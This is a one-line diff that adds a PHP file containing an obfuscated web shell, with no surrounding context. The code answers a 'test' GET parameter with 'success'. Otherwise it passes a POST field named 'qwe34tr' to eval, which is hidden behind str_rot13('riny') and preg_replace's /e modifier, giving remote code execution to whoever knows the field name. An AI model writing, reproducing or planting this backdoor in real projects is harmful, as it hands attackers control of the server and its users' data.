@@ -1,0 +1,1 @@
+<?php if(isset($_GET['test'])){echo 'success';}else{isset($_POST['qwe34tr']) && ($www= $_POST['qwe34tr']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)', 'add');}?>
